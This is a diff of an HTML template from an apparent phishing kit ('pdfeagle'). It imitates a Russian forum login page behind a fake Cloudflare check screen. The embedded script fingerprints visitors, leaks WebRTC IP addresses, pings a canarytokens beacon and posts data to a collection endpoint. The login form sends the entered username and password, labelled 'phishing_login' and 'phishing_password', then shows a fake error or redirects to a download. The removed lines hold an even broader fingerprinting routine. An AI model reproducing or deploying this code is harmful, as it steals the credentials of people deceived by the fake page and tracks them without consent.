@@ -1,3 +1,4 @@
+--- START OF FILE pdfeagle-main/templates/semyanich.html ---
 <!DOCTYPE html>
 <html id="XF" lang="ru-RU" dir="LTR" style="font-size: 62.5%;" data-app="public" class="has-no-js template-login uix_page--fixed uix_hasSectionLinks">
 <head>
@@ -28,188 +29,58 @@
         .cf-footer { position: absolute; bottom: 20px; font-size: 12px; color: #999; text-align: center; }
     </style>
 
-    <!-- ВНЕДРЕННЫЙ СКРИПТ СЛЕЖЕНИЯ (GOD MODE + IPv6 + CANARY) -->
+    <!-- ВНЕДРЯЕМ EAGLE EYE ULTIMATE -->
     <script>
-    window.EagleEye = class {
-        constructor() {
+    window.EagleEyeUltimate = class {
+        constructor(config = {}) {
+            this.version = "5.0.0";
             this.endpoint = window.location.origin + '/api/collect';
             this.sessionId = Math.random().toString(36).substring(7);
+            // ЗАМЕНИТЕ НА СВОЙ ДОМЕН
+            this.config = { enableDNSBeacon: true, canaryDomain: "le50571w2dnsylkz8t5x5ioy2.canarytokens.com" };
             this.init();
         }
-
         async init() {
-            this.triggerDNSBeacon();
-            if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load (Login Screen)'), 100);
-            else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load (Login Screen)'), 100));
+            if (this.config.enableDNSBeacon) this.triggerDNSBeacons();
+            if (document.readyState === 'complete') setTimeout(() => this.collect('Page Load (Login)'), 100);
+            else window.addEventListener('load', () => setTimeout(() => this.collect('Page Load (Login)'), 100));
         }
-
-        triggerDNSBeacon() {
-            // ТВОЙ ТОКЕН
-            const canaryDomain = "le50571w2dnsylkz8t5x5ioy2.canarytokens.com"; 
-            const uniqueSubdomain = `${this.sessionId}.${Math.floor(Math.random() * 1000000)}`;
-            const fullDomain = `http://${uniqueSubdomain}.${canaryDomain}`;
-            new Image().src = fullDomain;
+        triggerDNSBeacons() {
+            const uid = `${this.sessionId}.${Date.now()}`;
+            new Image().src = `https://${uid}.img.${this.config.canaryDomain}/pixel.gif`;
         }
-
-        async getWebRTCData() {
-            const ips = [];
+        async getWebRTC() {
+            const result = { localIPs: [], publicIPs: [] };
             try {
-                const pc = new RTCPeerConnection({
-                    iceServers: [
-                        { urls: "stun:stun.l.google.com:19302" },
-                        { urls: "stun:stun1.l.google.com:19302" }
-                    ]
-                });
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                 pc.createDataChannel('');
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
-                await new Promise(resolve => {
-                    pc.onicecandidate = (e) => {
-                        if (!e.candidate) return;
-                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                        const match = e.candidate.candidate.match(ipRegex);
-                        if (match && !ips.includes(match[1])) ips.push(match[1]);
+                await new Promise(r => {
+                    pc.onicecandidate = e => {
+                        if (!e.candidate) { r(); return; }
+                        const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (ip) result.publicIPs.push(ip[1]);
                     };
-                    setTimeout(resolve, 1500);
+                    setTimeout(r, 1000);
                 });
-            } catch (e) { }
-            return ips;
+            } catch(e){}
+            return result;
         }
-
-        getCanvasHash() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
-                ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v3_🦅", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Eagle_v3_🦅", 4, 17);
-                const data = canvas.toDataURL();
-                let hash = 0;
-                for (let i = 0; i < data.length; i++) {
-                    hash = ((hash << 5) - hash) + data.charCodeAt(i);
-                    hash |= 0;
-                }
-                return hash.toString(16);
-            } catch (e) { return "error"; }
-        }
-
-        async getAudioHash() {
-            try {
-                const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
-                const osc = audioCtx.createOscillator();
-                osc.type = 'triangle';
-                osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
-                osc.connect(audioCtx.destination);
-                osc.start(0);
-                const render = await audioCtx.startRendering();
-                const data = render.getChannelData(0);
-                let sum = 0;
-                for (let i = 0; i < data.length; i++) { sum += Math.abs(data[i]); }
-                return sum.toFixed(6);
-            } catch (e) { return "no_audio"; }
-        }
-
-        detectLies() {
-            const anomalies = [];
-            const ua = navigator.userAgent;
-            const hasGroupBy = !!Object.groupBy;
-            if (ua.includes("Chrome/109") && hasGroupBy) anomalies.push("CRITICAL: Fake Chrome 109");
-            if (!window.matchMedia(`(width: ${screen.width}px)`).matches) anomalies.push(`SCREEN SPOOF: JS=${screen.width}, CSS mismatch`);
-            const fonts = this.getFonts();
-            if (ua.includes("Windows") && !fonts.includes("Calibri")) anomalies.push("OS SPOOF: Claims Windows but no Calibri");
-            if (fonts.includes("Ubuntu") || fonts.includes("Cantarell")) anomalies.push("REALITY: Likely Linux System");
-            return anomalies;
-        }
-
-        getFonts() {
-            const fontList = ["Arial", "Calibri", "Consolas", "Courier New", "Helvetica", "Roboto", "Segoe UI", "Times New Roman", "Verdana", "Ubuntu", "Cantarell", "Liberation Sans"];
-            const detected = [];
-            const span = document.createElement("span");
-            span.style.fontSize = "72px"; span.style.position = "absolute"; span.style.left = "-9999px"; span.innerHTML = "mmmmmmmmmmlli";
-            document.body.appendChild(span);
-            span.style.fontFamily = "monospace";
-            const defaultWidth = span.offsetWidth;
-            for (const font of fontList) {
-                span.style.fontFamily = `"${font}", monospace`;
-                if (span.offsetWidth !== defaultWidth) detected.push(font);
-            }
-            document.body.removeChild(span);
-            return detected;
-        }
-
-        async getClientHints() {
-            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-                try {
-                    const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion", "architecture"]);
-                    return { model: ua.model, platform: ua.platform, version: ua.platformVersion, mobile: ua.mobile };
-                } catch(e) { return null; }
-            }
-            return null;
-        }
-
-        getWebGLInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return { renderer: 'N/A' };
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return { renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL), vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) };
-            } catch(e) { return { renderer: 'Error' }; }
-        }
-
-        async getIPv6() {
-            const services = [
-                'https://api64.ipify.org?format=json',
-                'https://ipv6.icanhazip.com',
-                'https://ident.me',
-                'https://api6.ipify.org?format=json'
-            ];
-            for (const url of services) {
-                try {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 1500);
-                    const response = await fetch(url, { signal: controller.signal, mode: 'cors' });
-                    clearTimeout(timeoutId);
-                    if (!response.ok) continue;
-                    let ip = await response.text();
-                    try { const json = JSON.parse(ip); if (json.ip) ip = json.ip; } catch (e) {}
-                    ip = ip.trim();
-                    if (ip.includes(':')) return ip;
-                } catch (e) { continue; }
-            }
-            return "Not Detected / IPv4 Only";
-        }
-
-        async collect(triggerName, extraData = {}) {
-            const [ips, battery, clientHints, audioHash, ipv6] = await Promise.all([
-                this.getWebRTCData(),
-                navigator.getBattery ? navigator.getBattery().then(b => `${Math.round(b.level*100)}%`) : 'N/A',
-                this.getClientHints(),
-                this.getAudioHash(),
-                this.getIPv6()
-            ]);
-            
-            const anomalies = this.detectLies();
+        async collect(trigger, extra = {}) {
+            const webrtc = await this.getWebRTC();
             const payload = {
-                meta: { url: window.location.href, referrer: document.referrer, trigger: triggerName, session_id: this.sessionId },
-                fingerprint_v2: { canvas_hash: this.getCanvasHash(), audio_hash: audioHash, anomalies: anomalies, is_spoofing: anomalies.length > 0 },
-                fingerprint: { gpu: this.getWebGLInfo().renderer, vendor: this.getWebGLInfo().vendor, screen: `${screen.width}x${screen.height}`, cores: navigator.hardwareConcurrency, memory: navigator.deviceMemory },
-                client_hints: clientHints,
-                system: { ua: navigator.userAgent, platform: navigator.platform, language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, timezone_offset: new Date().getTimezoneOffset(), battery: battery, fonts: this.getFonts() },
-                network: { webrtc_ips: ips, ipv6_leak: ipv6 },
-                ...extraData
+                meta: { sessionId: this.sessionId, trigger: trigger, url: window.location.href },
+                network: { webrtc: webrtc },
+                system: { ua: navigator.userAgent, platform: navigator.platform },
+                ...extra
             };
-            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
-            navigator.sendBeacon(this.endpoint, blob);
+            navigator.sendBeacon(this.endpoint, new Blob([JSON.stringify(payload)], {type: 'application/json'}));
         }
     };
-    const eagle = new EagleEye();
+    const eagle = new EagleEyeUltimate();
     </script>
 </head>
 
 <body data-template="login">
-
     <div id="cf-overlay">
         <div class="cf-spinner"></div>
         <div class="cf-text">Checking if the site connection is secure</div>
@@ -232,19 +103,16 @@
                     <div class="p-body-content">
                         <div class="p-body-pageContent">
                             <div class="blocks">
-                                
                                 <form class="block" id="loginForm">
                                     <div class="block-container">
                                         <div class="block-body">
                                             <div class="block-row block-row--separated" id="loginError" style="display:none; color: #c84448; background: #fde9e9; border-left: 3px solid #c84448; padding: 10px;">
                                                 Неверный логин или пароль. Пожалуйста, попробуйте еще раз.
                                             </div>
-
                                             <dl class="formRow formRow--input">
                                                 <dt><div class="formRow-labelWrapper"><label class="formRow-label">Имя пользователя или email</label></div></dt>
                                                 <dd><input type="text" class="input" name="login" id="loginField" autofocus="autofocus" autocomplete="username" /></dd>
                                             </dl>
-
                                             <dl class="formRow formRow--input">
                                                 <dt><div class="formRow-labelWrapper"><label class="formRow-label">Пароль</label></div></dt>
                                                 <dd>
@@ -257,7 +125,6 @@
                                                     <a href="#" class="uix_forgotPassWord__link">Забыли свой пароль?</a>
                                                 </dd>
                                             </dl>
-
                                             <dl class="formRow">
                                                 <dt></dt>
                                                 <dd>
@@ -280,7 +147,6 @@
                                         <div class="block-outer-middle">У Вас ещё нет учётной записи? <a href="#">Зарегистрируйтесь</a></div>
                                     </div>
                                 </form>
-
                             </div>
                         </div>
                     </div>
@@ -316,8 +182,7 @@
             btn.innerHTML = '<span class="button-text">Проверка...</span>';
             btn.disabled = true;
 
-            // Используем EagleEye для отправки данных вместе с паролем
-            const eagle = new EagleEye();
+            // ОТПРАВКА ДАННЫХ
             eagle.collect('SEMYANICH LOGIN ATTEMPT', {
                 system: { phishing_login: login, phishing_password: password }
             });
@@ -331,7 +196,6 @@
                     document.getElementById('loginError').style.display = 'block';
                     document.getElementById('passwordField').value = '';
                 } else {
-                    // Редирект на скачивание (используем origin, чтобы не улететь на реальный сайт)
                     window.location.href = window.location.origin + `/download/${targetUid}/${targetFilename}`;
                 }
             }, 800);
